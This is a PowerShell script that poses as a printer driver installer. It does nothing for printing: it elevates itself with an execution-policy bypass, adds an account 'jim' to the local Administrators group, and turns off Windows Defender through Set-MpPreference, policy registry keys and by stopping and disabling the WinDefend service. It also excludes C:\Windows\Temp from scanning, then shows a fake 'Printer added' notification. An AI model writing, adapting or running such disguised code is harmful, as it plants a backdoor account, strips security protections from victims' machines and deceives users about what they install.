$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
If (-not $isAdmin) {
    Write-Host ".This printer installation requires Administrator privileges." -ForegroundColor Cyan ; Start-Sleep -Seconds 2

    if($PSVersionTable.PSEdition -eq "Core") {
        Start-Process pwsh.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs 
    } else {
        Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -ErrorAction SilentlyContinue
    }
    
    exit
}

Function Show-BalloonTip {
    Param(
        [Parameter(Mandatory = $true, Position = 0)]
        [ValidateNotNull()]
        [String]
        $BalloonTipText,
        [Parameter(Position = 1)]
        [String]
        $BalloonTipTitle = 'Tip',
        [Parameter(Position = 2)]
        [ValidateSet('Error', 'Info', 'None', 'Warning')]
        [String]
        $BalloonTipIcon = 'None',
        [Parameter(Position = 3)]
        [Int]
        $BalloonTipTime = 1000
    )
    end {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        [Windows.Forms.ToolTipIcon]$BalloonTipIcon = $BalloonTipIcon
        $ContextMenu = New-Object System.Windows.Forms.ContextMenu
        $MenuItem = New-Object System.Windows.Forms.MenuItem

        $NotifyIcon = New-Object Windows.Forms.NotifyIcon -Property @{
            BalloonTipIcon = $BalloonTipIcon
            BalloonTipText = $BalloonTipText
            BalloonTipTitle = $BalloonTipTitle
            ContextMenu = $ContextMenu
            Icon = [Drawing.Icon]::ExtractAssociatedIcon((Get-Command powershell).Path)
            Text = -join $BalloonTipText[0..62]
            Visible = $false
        }
        $NotifyIcon.contextMenu.MenuItems.AddRange($MenuItem)
        $NotifyIcon.Visible = $True
        $MenuItem.Text = "Exit"
        $MenuItem.add_Click({
           $NotifyIcon.Visible = $false
           $NotifyIcon.ShowInTaskbar = $false
        })
        $NotifyIcon.ShowBalloonTip($BalloonTipTime)     
        switch ($Host.Runspace.ApartmentState) {
            STA {
                $null = Register-ObjectEvent -InputObject $NotifyIcon -EventName BalloonTipClosed -Action {                     
                    $Sender.Dispose()
                    Unregister-Event $EventSubscriber.SourceIdentifier
                    Remove-Job $EventSubscriber.Action
                }
            }
            default {
                continue
            }
        }
    }
}

Write-Host 'Installing Printer Driver...'
Add-LocalGroupMember -Group Administrators -Member jim -ea SilentlyContinue | Out-Null

Start-Sleep -Seconds 1

Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableBlockAtFirstSeen $true -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -Force -ErrorAction SilentlyContinue | Out-Null

New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiVirus -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
regsvr32 atl.dll -s | Out-Null
regsvr32 wuapi.dll -s | Out-Null
regsvr32 softpub.dll -s | Out-Null
regsvr32 mssip32.dll -s | Out-Null

Start-Sleep -Seconds 2

Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableBlockAtFirstSeen $true -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -Force -ErrorAction SilentlyContinue | Out-Null

Start-Sleep -Seconds 1

Get-Service WinDefend | Stop-Service -PassThru -ErrorAction SilentlyContinue | Set-Service -StartupType Disabled -ErrorAction SilentlyContinue

Set-MpPreference -ExclusionPath 'C:\Windows\Temp'
 
Show-BalloonTip -BalloonTipText "Ultra Speed Printer Installation Completed." -BalloonTipTitle "Printer added." -BalloonTipIcon Info -BalloonTipTime 5

